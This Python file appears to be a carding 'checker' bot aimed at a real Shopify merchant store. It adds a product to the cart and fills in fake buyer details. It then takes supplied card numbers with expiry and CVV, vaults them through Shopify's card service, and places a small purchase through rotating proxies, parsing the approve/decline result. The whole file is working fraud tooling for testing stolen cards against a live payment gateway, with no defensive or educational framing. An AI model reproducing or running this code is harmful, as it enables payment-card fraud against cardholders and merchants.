import time,random
from requests import Session
from retry_requests import retry
from dataclasses import dataclass
from ShopifyBic.conf.ShopifyAccion import BehaviorsShopify,RandomProxies
from srca.configs import rnd_prox



@dataclass
class edsheeran:

    @classmethod
    def run(self,ccs):
        try:
            self.session = retry(Session(), retries=5, backoff_factor=0.2)
            self.session.proxies = rnd_prox()

            self.dataO = {'id': '43613093036181'}
            self.session.post(url='https://usstore.edsheeran.com/cart/add', data=self.dataO)

            self.req_1 = self.session.get(url='https://usstore.edsheeran.com/checkout')
            self.urlchk = self.req_1.url
            
            self.token = BehaviorsShopify().Token_()

            self.mail  = BehaviorsShopify().RandomName('correo')
            self.user  = BehaviorsShopify().RandomName('username')
            self.ccs   = BehaviorsShopify().Ccs(ccs)

            self.dataT = f'_method=patch&authenticity_token={self.token}&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D={self.mail}&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Juan&checkout%5Bbilling_address%5D%5Blast_name%5D=arcules&checkout%5Bbilling_address%5D%5Baddress1%5D=street+234&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=NY&checkout%5Bbilling_address%5D%5Bcountry%5D=US&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10001&checkout%5Bbilling_address%5D%5Bphone%5D=3655476455&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=Juan&checkout%5Bbilling_address%5D%5Blast_name%5D=arcules&checkout%5Bbilling_address%5D%5Baddress1%5D=street+234&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=NY&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10001&checkout%5Bbilling_address%5D%5Bphone%5D=3655476455&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&button=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1040&checkout%5Bclient_details%5D%5Bbrowser_height%5D=991&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
            self.heads = {'Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'}
            self.session.post(url=self.urlchk, headers=self.heads,data=self.dataT)

            self.dataW = f'_method=patch&authenticity_token={self.token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Ground%2520Shipping%2520%287-10%2520days%29-7.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1040&checkout%5Bclient_details%5D%5Bbrowser_height%5D=991&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
            #self.session.post(url=self.urlchk, headers=self.heads,data=self.dataW)
            
            self.dataF  = {"credit_card": {"number": self.ccs[0],"name": self.user,"month": self.ccs[1],"year": self.ccs[2],"verification_value": self.ccs[3]},"payment_session_scope": 'usstore.edsheeran.com'}
            self.req_2  = self.session.post(url= 'https://deposit.us.shopifycs.com/sessions', json=self.dataF)
            self.idwes  = self.req_2.json()['id']

            self.dataX  = f'_method=patch&authenticity_token={self.token}&previous_step=payment_method&step=&s={self.idwes}&checkout%5Bpayment_gateway%5D=76050301077&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=499&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1040&checkout%5Bclient_details%5D%5Bbrowser_height%5D=991&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300'
            self.req_3  = self.session.post(url= self.urlchk, data= self.dataX)

            time.sleep(4)

            self.req_4 = self.session.get(str(self.req_3.url) + '?from_processing_page=1')
            self.req_5 = self.session.get(self.req_4.url)
            
            self.resultados = BehaviorsShopify().QueryNotice(self.req_5.text)
            
            self.response   = BehaviorsShopify().Response(self.resultados, self.req_5.url,'27.23')
            return self.response
            
        except: return 'Declined! ❌','2047 Call Issuer. Pick Up Card.'


